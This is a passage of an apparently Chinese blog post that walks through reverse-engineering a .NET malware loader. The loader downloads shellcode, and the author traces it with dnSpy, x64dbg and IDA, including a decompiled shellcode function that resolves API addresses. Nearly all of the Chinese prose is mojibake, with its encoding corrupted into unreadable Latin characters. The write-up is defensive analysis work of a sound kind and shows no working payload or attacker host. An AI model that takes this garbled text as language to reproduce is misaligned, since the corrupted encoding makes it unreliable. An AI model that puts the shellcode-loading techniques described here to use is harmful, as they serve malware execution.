·æœ¬åœ¨è¿è¡Œæ—¶ç¯å¢ƒä¸­ä¸‹è½½äº†ä¸€ä¸ªæœ‰æ•ˆè´Ÿè½½ï¼ˆpayloadï¼‰ï¼Œå°†å…¶å†™å…¥å†…å­˜ï¼Œå¹¶å°†æŒ‡å‘è¯¥å†…å­˜çš„æŒ‡é’ˆè½¬æ¢ä¸ºå§”æ‰˜ï¼ˆdelegateï¼‰åè°ƒç”¨ã€‚</p><p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜èƒ½ç”¨ <strong>dnSpy</strong> å•æ­¥è°ƒè¯•æ‰˜ç®¡ä»£ç ï¼Œä½†ç”±äºæ‰§è¡Œè·³è½¬åˆ°äº†éæ‰˜ç®¡ä»£ç ï¼Œæˆ‘ä»¬å¤±å»äº†å¯¹æ ·æœ¬æ‰§è¡Œæµçš„å¯è§æ€§ï¼Œä¹Ÿæ— æ³•å†ç”¨ dnSpy çš„è°ƒè¯•å™¨æ§åˆ¶å…¶æ‰§è¡Œã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•ä½¿ç”¨<strong>åŸç”Ÿè°ƒè¯•å™¨ï¼ˆå¦‚ x64dbgï¼‰é™„åŠ åˆ°è¿›ç¨‹</strong>ï¼Œä»¥ä¾¿åˆ†æshellcodeè¡Œä¸ºã€‚</p><h3 id="å¼€å§‹è°ƒè¯•åˆ†æshellcode"><a href="#å¼€å§‹è°ƒè¯•åˆ†æshellcode" class="headerlink" title="å¼€å§‹è°ƒè¯•åˆ†æshellcode"></a>å¼€å§‹è°ƒè¯•åˆ†æshellcode</h3><p>æˆ‘ä»¬é¦–å…ˆå°†æ ·æœ¬åŠ è½½åˆ°x64dbgä¸­ï¼Œç„¶ååœ¨kernel32ä¸Šè®¾ç½®æ–­ç‚¹ã€‚é€šè¿‡é€‰æ‹©â€œç¬¦å·â€é€‰é¡¹å¡&gt;åœ¨æ¨¡å—æœç´¢æ ä¸­è¾“å…¥â€˜kernel32.dllâ€™&gt;åœ¨ç¬¦å·æœç´¢æ ä¸­è¾“å…¥â€˜VirtualProtectâ€™&gt;å³é”®å•å‡»â€˜VirtualProtectâ€™&gt;ç‚¹å‡»â€˜åˆ‡æ¢æ–­ç‚¹â€™</p><p>è¿™ä¸ªé€†å‘çš„è¿‡ç¨‹ä¾é æ›´å¤šçš„è¿˜æ˜¯ç»éªŒã€‚åˆæ¬¡çœ‹çš„æ—¶å€™æˆ‘çœ‹ä¸åˆ°ï¼Œæ‰€ä»¥è¿™é‡Œå†™è¯¦ç»†ä¸€ç‚¹ï¼Œå†™å¦‚ä½•ä¾é çš„AIã€‚</p><p>æ˜¯è¿™ä¸ªæ–­ç‚¹ï¼Œé‡Œé¢å†™çš„å‚æ•°å…ˆä¸è¯´äº†ï¼Œæ˜¯æ ¹æ®dnspyé‡Œé¢å‡½æ•°è°ƒç”¨æƒ…å†µï¼ŒåŠ æ–­ç‚¹è°ƒè¯•ï¼Œæ˜¯è¿™ä¸ªå‚æ•°ï¼Œè®¾ç½®å†…å­˜ä¿æŠ¤å±æ€§çš„ï¼Œä¸‹åˆ°è¿™ä¸ªæ–­ç‚¹çš„æ—¶å€™ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å †æ ˆæƒ…å†µï¼ˆä½¿ç”¨è™šæ‹Ÿæœºçš„æ—¶å€™å¾ˆæ…¢å¾ˆæ…¢ï¼Œå› ä¸ºå‰é¢æœ‰ä¸€ä¸ªè®¿é—®å¤–ç½‘æŸç½‘å€è·å–shellcodeçš„åœ°æ–¹ï¼‰</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819182443590.png" alt="image-20250819182443590"></p><p>æˆ‘ç›´æ¥çœŸæœºä¸Šäº†ï¼Œå¾ˆå¿«ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819183105151.png" alt="image-20250819183105151"></p><p>çœ‹å³ä¸‹è§’å †æ ˆï¼Œç»“åˆå‡½æ•°åŸå‹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819183613364.png" alt="image-20250819183613364"></p><p>åœ¨ <strong>x86æ¶æ„</strong> ä¸­ï¼Œå‚æ•°é€šè¿‡æ ˆä¼ é€’ï¼ˆä»å³å‘å·¦å‹æ ˆï¼‰ï¼Œè°ƒç”¨åçš„å †æ ˆå¸ƒå±€å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ESP+<span class="number">00</span>] è¿”å›åœ°å€ (Return Address)</span><br><span class="line">[ESP+<span class="number">04</span>] lpAddress</span><br><span class="line">[ESP+<span class="number">08</span>] dwSize</span><br><span class="line">[ESP+<span class="number">0</span>C] flNewProtect</span><br><span class="line">[ESP+<span class="number">10</span>] lpflOldProtect</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™ä¸ªä½ç½®å°±æ˜¯è®¾ç½®å†…å­˜ä¿æŠ¤è¿™å—çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰å¼€è¾Ÿçš„ä¸€å—å†…å­˜çš„å­˜æ”¾ç€shellcodeï¼Œç»™äº†æƒé™ä¹‹åè¿›è¡Œæ‰§è¡Œçš„ï¼Œè¿™ä¸ªä¹‹å‰åœ¨ä½¿ç”¨dnspyçš„æ—¶å€™å·²ç»çŸ¥é“æµç¨‹äº†ï¼Œç°åœ¨æˆ‘ä»¬å»è¿™ä¸ªå†…å­˜é‡Œé¢çœ‹ä¸€ä¸‹æƒ…å†µã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819183701243.png" alt="image-20250819183701243"></p><p>ä¸‹æ–­ç‚¹ï¼Œç„¶åè¿è¡Œè¿›è¡Œè·³è½¬åˆ°shellcode</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819184125406.png" alt="image-20250819184125406"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819184150588.png" alt="image-20250819184150588"></p><p>ä¸Šé¢ä¸‹æ–­ç‚¹ä¸å¥½ç”¨ï¼Œä¸‹é¢çš„ç›´æ¥ç¡¬ä»¶æ–­ç‚¹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819184851021.png" alt="image-20250819184851021"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819184928111.png" alt="image-20250819184928111"></p><p>ç°åœ¨å°±æ˜¯shellcodeçš„ä»£ç äº†ï¼Œå¯ä»¥æŠŠè¿™ä¸€å—å†…å­˜å¯¼å‡ºæ–‡ä»¶ï¼Œä½¿ç”¨idaæŸ¥çœ‹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819185055196.png" alt="image-20250819185055196"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819185233019.png" alt="image-20250819185233019"></p><p>x64dbgè°ƒè¯•ä¸€ä¸‹ï¼Œè¿›å…¥è¿™ä¸ªcallã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819185442799.png" alt="image-20250819185442799"></p><p>çœ‹ç€åƒæ˜¯åœ¨æ‰§è¡Œä¸€ä¸ªå‡½æ•°ä¹‹å‰çš„æ“ä½œï¼Œæˆ‘ä»¬ç›´æ¥å»idaæ‰“å¼€åˆšåˆšå­˜å‚¨çš„binç„¶åè¿›è¡Œæœç´¢å­—èŠ‚ï¼Œå®šä½åˆ°è¿™ä¸ª7C9Bå‡½æ•°ï¼ˆé¡¶éƒ¨èœå•æ ä¸­çš„â€œæœç´¢â€&gt;â€œä¸‹ä¸€ä¸ªå­—èŠ‚åºåˆ—â€ï¼‰ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819101958888.png" alt="image-20250819101958888"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åŠ¨æ€è°ƒè¯•æ˜¯call 0xxx7C9Bï¼Œidaæ˜¯sub_xx7C9B,è¿™ä¸ªå…³è”å¯ä»¥è®©æˆ‘ä»¬æ›´å¥½çš„çŸ¥é“æˆ‘ä»¬åœ¨çœ‹å“ªä¸ªå‡½æ•°ï¼ŒåŠ¨é™ç»“åˆ,å¦‚ä¸‹æ˜¯è¿™ä¸ªå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __usercall sub_107C9B@&lt;eax&gt;(<span class="type">int</span> a1@&lt;ebx&gt;, <span class="type">int</span> a2@&lt;ebp&gt;, <span class="type">int</span> a3@&lt;edi&gt;, <span class="type">int</span> a4@&lt;esi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v4; <span class="comment">// edx</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> (__cdecl *func_ptr)(_DWORD); <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> func_ptr_1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (__cdecl *func_ptr_3)(<span class="type">int</span>); <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> (__cdecl *func_ptr_4)(_DWORD *); <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp-24h] [ebp-31Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp-4h] [ebp-2FCh]</span></span><br><span class="line">  _DWORD *v16; <span class="comment">// [esp+0h] [ebp-2F8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> func_ptr_2; <span class="comment">// [esp+4h] [ebp-2F4h]</span></span><br><span class="line">  _DWORD v18[<span class="number">46</span>]; <span class="comment">// [esp+8h] [ebp-2F0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+C4h] [ebp-234h]</span></span><br><span class="line">  _DWORD *v20; <span class="comment">// [esp+2F0h] [ebp-8h]</span></span><br><span class="line">  _DWORD *v21; <span class="comment">// [esp+2F4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = v21;</span><br><span class="line">  v21 = v20;</span><br><span class="line">  v20 = v4;</span><br><span class="line">  v18[<span class="number">4</span>] = a1;</span><br><span class="line">  v18[<span class="number">3</span>] = a2;</span><br><span class="line">  v18[<span class="number">2</span>] = a4;</span><br><span class="line">  v5 = v21;</span><br><span class="line">  v18[<span class="number">1</span>] = a3;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v21[<span class="number">142</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    func_ptr = (<span class="type">int</span> (__cdecl *)(_DWORD))sub_10A51D((<span class="type">int</span>)v21, v21[<span class="number">34</span>], v21[<span class="number">35</span>], v21[<span class="number">10</span>], v21[<span class="number">11</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( !func_ptr )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    v18[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    func_ptr_2 = <span class="number">0</span>;</span><br><span class="line">    v16 = v21;</span><br><span class="line">    v15 = sub_10A31A() - <span class="number">5028</span>;</span><br><span class="line">    v6 = func_ptr(<span class="number">0</span>);</span><br><span class="line">    func_ptr_1 = sub_10A51D((<span class="type">int</span>)v21, v21[<span class="number">130</span>], v21[<span class="number">131</span>], v21[<span class="number">10</span>], v21[<span class="number">11</span>]);</span><br><span class="line">    v14 = v21[<span class="number">11</span>];</span><br><span class="line">    func_ptr_2 = func_ptr_1;</span><br><span class="line">    func_ptr_3 = (<span class="type">void</span> (__cdecl *)(<span class="type">int</span>))sub_10A51D((<span class="type">int</span>)v21, v21[<span class="number">40</span>], v21[<span class="number">41</span>], v21[<span class="number">10</span>], v14);</span><br><span class="line">    func_ptr_4 = (<span class="type">int</span> (__cdecl *)(_DWORD *))sub_10A51D((<span class="type">int</span>)v21, v21[<span class="number">42</span>], v21[<span class="number">43</span>], v21[<span class="number">10</span>], v21[<span class="number">11</span>]);</span><br><span class="line">    func_ptr_2 = ((<span class="type">int</span> (__cdecl *)(_DWORD))v21[<span class="number">14</span>])(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v21 &amp;&amp; func_ptr_3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( func_ptr_4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v18[<span class="number">0</span>] = &amp;byte_10007;</span><br><span class="line">        v11 = func_ptr_4(v18);</span><br><span class="line">        func_ptr_3(v11);</span><br><span class="line">        v12 = v15 + v5[<span class="number">142</span>];</span><br><span class="line">        v19 &amp;= <span class="number">0xFFFFFFFC</span>;</span><br><span class="line">        v18[<span class="number">44</span>] = v12;</span><br><span class="line">        ((<span class="type">void</span> (__cdecl *)(_DWORD **, _DWORD))unk_0)(&amp;v16, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_108F76(v21);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆæ‰§è¡Œä¸€ä¸‹åŠ¨æ€çš„ï¼Œçœ‹çœ‹ä»–åšäº†ä»€ä¹ˆï¼ŒF8æ­¥è¿‡åˆ°è¿™ä¸ªåœ°æ–¹äº†ã€‚8F76å‡½æ•°ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹idaï¼Œè¿™ä¸å°±æ˜¯æœ€ä¸‹é¢çš„å‡½æ•°å—ï¼Œè¯´æ˜æœ€å¤–å±‚çš„ifæ²¡æœ‰è¿‡ã€‚if ( v21[142] )</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819190228409.png" alt="image-20250819190228409"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819190314796.png" alt="image-20250819190314796"></p><p>ç„¶åæˆ‘ä»¬idaè¿›å…¥è¿™ä¸ª8F76å‡½æ•°çœ‹ä¸€ä¸‹ã€‚çœ‹åˆ°å‰é¢éƒ½æ˜¯è°ƒç”¨äº†sub_10A51Då‡½æ•°ã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819190447856.png" alt="image-20250819190447856"></p><p>ç›´æ¥æŠŠè¿™ä¸ªsub_10A51Dä¸¢ç»™AIé—®ä¸€ä¸‹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819190809654.png" alt="image-20250819190809654"></p><p>ç„¶åæ¥åŠ¨æ€è°ƒè¯•ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819190854271.png" alt="image-20250819190854271"></p><p>æ‰§è¡Œå®Œäº†ç¬¬ä¸€ä¸ª <strong><code>sub_10A51D</code></strong></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819191156212.png" alt="image-20250819191156212"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819191228668.png" alt="image-20250819191228668"></p><p>åé¢çš„ä¹Ÿæ˜¯ä¸€æ ·æ— éå°±æ˜¯è·å–å‡½æ•°åœ°å€ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬è¿™é‡Œå…ˆå»IDAç»™è¿™ä¸ªå‡½æ•°æ ‡è®°ä¸Šã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819191347102.png" alt="image-20250819191347102"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819191549686.png" alt="image-20250819191549686"></p><p>ä»–å‰é¢è°ƒç”¨çš„ä¸‰ä¸ªè¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¿«é€Ÿåœ¨åŠ¨æ€è°ƒè¯•é‡Œé¢æ‹¿åˆ°è¿”å›å€¼ï¼Œåœ¨idaæ ‡è®°ä»–è°ƒç”¨äº†å“ªäº›å‡½æ•°ï¼Œç„¶åè¿›è¡Œæ”¹åã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819191857176.png" alt="image-20250819191857176"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819191920695.png" alt="image-20250819191920695"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819192139655.png" alt="image-20250819192139655"></p><p>æˆ‘ä»¬å°†å‘å‰æ¨è¿›ï¼Œç›´åˆ°åˆ°è¾¾ä¸‹ä¸€ä¸ªåŠŸèƒ½ï¼Œç”³è¯·äº†ä¸€å—å†…å­˜ã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819192250261.png" alt="image-20250819192250261"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819192351165.png" alt="image-20250819192351165"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819192605681.png" alt="image-20250819192605681"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819192643119.png" alt="image-20250819192643119"></p><p>æˆ‘ä»¬åœ¨idaä¹Ÿè¿›è¡Œä¸€ä¸ªé‡å‘½åï¼Œä¸€ä¸ªç”³è¯·çš„å†…å­˜ç©ºé—´ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819192814748.png" alt="image-20250819192814748"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819193119151.png" alt="image-20250819193119151"></p><p>ç»™x64dbgtä¹Ÿæ ‡è®°ä¸€ä¸‹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819193442660.png" alt="image-20250819193442660"></p><p>ç„¶åè¿›è¡Œä¸‹é¢çš„è°ƒè¯•ã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819193530011.png" alt="image-20250819193530011"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819193542605.png" alt="image-20250819193542605"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819193929199.png" alt="image-20250819193929199"></p><p>è¿™ä¸ªå‡½æ•° <code>sub_10A992</code>æ˜¯ä¸€ä¸ª <strong>å†…å­˜æ•°æ®å¤åˆ¶å‡½æ•°</strong>ï¼Œå…¶ä½œç”¨æ˜¯å°†æºåœ°å€ (<code>a2</code>) çš„æ•°æ®å¤åˆ¶åˆ°ç›®æ ‡åœ°å€ (<code>a1</code>)ï¼Œå¤åˆ¶çš„é•¿åº¦ä¸º <code>a3</code>å­—èŠ‚ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819194038086.png" alt="image-20250819194038086"></p><p>  sub_10A9B6(v31, 0, 32);</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819194311382.png" alt="image-20250819194311382"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819194340317.png" alt="image-20250819194340317"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819194428623.png" alt="image-20250819194428623"></p><p>ç„¶åè¿›è¡Œidaé‡å‘½åï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ä¾èµ–çš„å¤§éƒ¨åˆ†éƒ½æ˜¯AIç»“åˆIDAäº†ï¼Œå¯ä»¥å†å»x64dbgçœ‹ä¸€ä¸‹ï¼Œè°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œå‚æ•°æƒ…å†µï¼Œç„¶åçœ‹ä¸€ä¸‹é‡Œé¢çš„å†…å­˜æƒ…å†µï¼Œå¯¹è‡ªå·±çš„é€†å‘æœ‰å¸®åŠ©ï¼Œå¯ä»¥æ›´å¥½çš„ç†Ÿæ‚‰æ“ä½œã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819194622836.png" alt="image-20250819194622836"></p><p>æ¯”å¦‚è¿™ä¸ªå¤åˆ¶å†…å­˜ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819194904488.png" alt="image-20250819194904488"></p><p>è¿™ä¸ªå†…å­˜é‡Œé¢çš„å†…å®¹æ˜¯è¿™æ ·</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195144303.png" alt="image-20250819195144303"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195209783.png" alt="image-20250819195209783"></p><p>æ‰§è¡Œä¹‹åã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195226417.png" alt="image-20250819195226417"></p><p>è¿™ä¸ªmemsetæ“ä½œçš„ï¼Œå¦‚ä¸‹ã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195308605.png" alt="image-20250819195308605"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195404950.png" alt="image-20250819195404950"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195427451.png" alt="image-20250819195427451"></p><p>è¿™äº›å­—èŠ‚è¢«æ¸…é›¶çš„ç›®çš„å¹¶ä¸æ˜æ˜¾ã€‚æˆ‘ä»¬éœ€è¦ç»§ç»­åˆ†æï¼Œå¸Œæœ›åç»­å†…å®¹èƒ½æ›´æ¸…æ™°åœ°æ­ç¤ºå…¶ç”¨é€”ã€‚æˆ‘ä»¬å°†åœ¨IDA Proä¸­å°†ä¿®æ”¹åçš„å˜é‡é‡å‘½åä¸ºzeroed_out_memï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195530061.png" alt="image-20250819195530061"></p><p>ç»§ç»­è°ƒç”¨ä¸‹ä¸€ä¸ªå‡½æ•°ï¼Œsub_10A68A</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195721262.png" alt="image-20250819195721262"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195743378.png" alt="image-20250819195743378"></p><p>é—®é—®</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195822995.png" alt="image-20250819195822995"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819200205865.png" alt="image-20250819200205865"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819200337384.png" alt="image-20250819200337384"></p><p>æ ¹æ®AIï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯è§£å¯†çš„åŒºåŸŸï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹è§£å¯†ä¹‹å‰çš„ã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819200435492.png" alt="image-20250819200435492"></p><p>è§£å¯†ä¹‹å</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819200449325.png" alt="image-20250819200449325"></p><p>é‡å‘½å</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819200548044.png" alt="image-20250819200548044"></p><p>ç»§ç»­å¾€ä¸‹èµ°</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819230514108.png" alt="image-20250819230514108"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819230603982.png" alt="image-20250819230603982"></p><p>é‡å‘½å</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819232507968.png" alt="image-20250819232507968"></p><p>è§‚çœ‹è¿™ä¸ªå¾ªç¯</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819232456739.png" alt="image-20250819232456739"></p><p>é—®é—®</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819232736796.png" alt="image-20250819232736796"></p><p>åŠ¨æ€è°ƒè¯•ä¼šè¿›å…¥è¿™ä¸ªå¾ªç¯é‡Œé¢ï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„sub_10A324çš„è°ƒç”¨æ—¶é—´ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819233310755.png" alt="image-20250819233310755"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819233343857.png" alt="image-20250819233343857"></p><p>è¿™é‡Œè¿›å…¥å¾ªç¯çš„æ—¶å€™ï¼Œå¦‚ä¸‹å›¾è¿™ä¸ªåœ°æ–¹ï¼Œå¯ä»¥çœ‹åˆ°è¿›è¡Œäº†inc eaxå’Œinc edxï¼Œä¸¤ä¸ªè‡ªå·±å¢åŠ çš„æ“ä½œï¼ŒEDXé‡Œé¢å­˜å‚¨äº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ¯”è¾ƒCLè·ŸEDXæ˜¯å¦ç›¸ç­‰ï¼ŒCLæ˜¯åˆ†å·ç¬¦å·ã€‚EAXè®°å½•äº†å¾ªç¯äº†å‡ æ¬¡çš„æ“ä½œã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819233422194.png" alt="image-20250819233422194"></p><p>æ¥ä¸‹æ¥çœ‹ä¸‹é¢æ“ä½œESIï¼ŒESIé‡Œé¢å­˜å‚¨çš„ä¹Ÿæ˜¯é‚£ä¸ªå­—ç¬¦ä¸²ï¼Œé‡Œé¢å­˜å‚¨çš„DLLçš„åå­—ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819233808794.png" alt="image-20250819233808794"></p><p>ç„¶åESIåŠ ä¸Šäº†EAXè¿™ä¸ªè®¡æ•°å™¨ï¼Œç›´æ¥å°±æŠŠå‰é¢è¿™ä¸ªdllçš„åå­—ææ²¡äº†ï¼Œå¹¶ä¸”ä½¿ç”¨espçš„æ“ä½œï¼Œeaxç°åœ¨æ˜¯è¿™ä¸ªdllçš„åå­—ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819233957451.png" alt="image-20250819233957451"></p><p>æ¥ç€å°±å¼€å§‹è°ƒç”¨è¿™ä¸ªsub_10A324(alloced_mem_copy, v32)å‡½æ•°ã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819234057987.png" alt="image-20250819234057987"></p><p>è°ƒç”¨ä¹‹åè¿”å›å€¼EAXå˜æˆäº†ole32.76d30000</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819234204926.png" alt="image-20250819234204926"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819234328691.png" alt="image-20250819234328691"></p><p>çœ‹èµ·æ¥sub_10A324å°†DLLçš„åç§°ä½œä¸ºè¾“å…¥ï¼Œå¹¶è¿”å›è¯¥DLLçš„å¥æŸ„ã€‚è¿™ä¸ªå®‰æ’æ˜¯åˆç†çš„ï¼Œå› 